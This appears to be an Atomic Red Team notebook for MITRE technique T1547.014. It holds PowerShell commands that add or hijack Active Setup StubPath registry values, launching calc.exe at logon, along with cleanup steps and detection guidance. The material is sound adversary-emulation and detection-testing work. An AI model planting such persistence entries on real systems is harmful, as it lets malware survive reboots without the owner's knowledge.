{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "26eac9cd",
   "metadata": {},
   "source": "# T1547.014 - Active Setup\nAdversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs."
  },
  {
   "cell_type": "markdown",
   "id": "a9ea8747",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "f946a766",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - HKLM - Add atomic_test key to launch executable as part of user setup",
    "This test will create an \"atomic_test\" key under 'HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components' to launch calc by configuring an active setup executable and \nforcing to run active setup using the \"runonce.exe /AlternateShellStartup\" command. \nWithout the \"runonce.exe /AlternateShellStartup\" command it would run during the next logon for each user.\n\nNote: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. \nThe payload will only run once unless the cleanup command is run in between tests.\n\n[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"C:\\Windows\\System32\\calc.exe\" -Force \n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "67a3e5b8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.014 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "0d098b0f",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" -Force -ErrorAction Ignore\nRemove-Item \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" -Force -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f14a1852",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.014 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "49769226",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - HKLM - Add malicious StubPath value to existing Active Setup Entry",
    "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) \nSaid key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. \nWithout the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" \"StubPath\" \"C:\\Windows\\System32\\calc.exe\" -Force\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ea05ef8a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.014 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "ef53d9ac",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"StubPath\" -Force\nRemove-ItemProperty \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Force```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d669a1c3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.014 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6200c0a8",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number",
    "This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5419ed4b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.014 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "5e15c235",
   "metadata": {},
   "source": "## Detection\nMonitor Registry key additions and/or modifications to <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code>.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.(Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}